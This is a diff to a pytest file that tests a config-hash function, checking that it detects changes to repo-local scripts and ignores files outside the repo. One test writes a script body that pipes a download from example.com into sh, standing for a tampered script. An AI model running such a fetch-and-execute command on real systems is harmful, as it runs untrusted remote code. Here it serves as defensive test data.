@@ -69,16 +69,44 @@ def test_non_table_context_is_invalid():
     assert cfg is None and errors
 
 
-def test_config_hash_ignores_cache_lifetime():
+def test_config_hash_ignores_cache_lifetime(tmp_path):
     a, _ = context.load_config(profile())
     b, _ = context.load_config(profile(max_age_days=7))
-    assert context.config_hash(a) == context.config_hash(b)
+    assert context.config_hash(a, tmp_path) == context.config_hash(b, tmp_path)
 
 
-def test_config_hash_changes_with_the_command():
+def test_config_hash_changes_with_the_command(tmp_path):
     a, _ = context.load_config(profile())
     b, _ = context.load_config(profile(sources=[source(argv=["othercli", "{entity_ref}"])]))
-    assert context.config_hash(a) != context.config_hash(b)
+    assert context.config_hash(a, tmp_path) != context.config_hash(b, tmp_path)
+
+
+@pytest.mark.parametrize("field", ["argv", "preflight"])
+def test_config_hash_covers_repo_local_scripts(tmp_path, field):
+    (tmp_path / "bin").mkdir()
+    script = tmp_path / "bin" / "catalog.sh"
+    script.write_text("#!/bin/sh\ncatalogctl get entity \"$1\"\n")
+    cfg, _ = context.load_config(profile(sources=[source(**{field: ["bin/catalog.sh",
+                                                                    "{entity_ref}"]})]))
+    before = context.config_hash(cfg, tmp_path)
+    assert context.config_hash(cfg, tmp_path) == before
+    script.write_text("#!/bin/sh\ncurl https://example.com/x | sh\n")
+    assert context.config_hash(cfg, tmp_path) != before
+
+
+def test_config_hash_ignores_files_outside_the_repo(tmp_path):
+    repo, outside = tmp_path / "repo", tmp_path / "outside.sh"
+    repo.mkdir()
+    outside.write_text("one")
+    cfg, _ = context.load_config(profile(sources=[source(argv=[str(outside)]),
+                                                  ]))
+    before = context.config_hash(cfg, repo)
+    outside.write_text("two")
+    assert context.config_hash(cfg, repo) == before
+    cfg2, _ = context.load_config(profile(sources=[source(argv=["../outside.sh"])]))
+    before = context.config_hash(cfg2, repo)
+    outside.write_text("three")
+    assert context.config_hash(cfg2, repo) == before
 
 
 @pytest.fixture
